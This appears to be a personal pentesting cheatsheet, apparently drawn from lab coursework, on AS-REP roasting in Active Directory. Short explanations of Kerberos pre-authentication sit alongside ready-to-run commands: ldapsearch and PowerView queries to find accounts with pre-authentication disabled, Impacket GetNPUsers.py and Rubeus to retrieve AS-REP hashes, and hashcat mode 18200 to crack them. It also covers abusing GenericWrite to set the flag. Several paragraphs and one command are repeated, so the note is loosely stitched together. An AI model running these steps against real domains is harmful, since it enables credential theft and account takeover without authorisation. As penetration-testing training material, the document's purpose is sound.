It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. 

If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.


you dont need any Pre-Auth to check for asreproastable users. you supply the tool with valid users list, and it does the thing.

# Cheatsheet

using ldapsearch in linux: find users with the `DONT_REQUIRE_PREAUTH` flag (0x400000) set:
```bash
ldapsearch -x -LLL -H ldap://<domain-controller> -D '<bind-user>@<domain>' -W -b "dc=example,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName userPrincipalName
```

#### using powerview to get users where preauthnotrequired is set (fastest)
`PowerView`
```powershell-session
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

## GetNPUsers.py (brute)
`find all users where donotrequirepreauth enabled  and perform asreproast`
```
 GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
2. another method
```shell-session
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5  -usersfile valid_ad_users 
```



#### Retrieving AS-REP in Proper Format using Rubeus
- `-usersfile`: Provide a list of usernames to test for this vulnerability.
```powershell-session
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```


`crack asrep with mode 18200`
```shell-session
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```
`Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser`
```powershell-session
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. 
The Domain Controller will decrypt this to validate that the correct password was used.

If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller.

This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.
![](Screenshots/Pasted%20image%2020241224174240.png)
If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.

Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.

#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser


```powershell-session
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```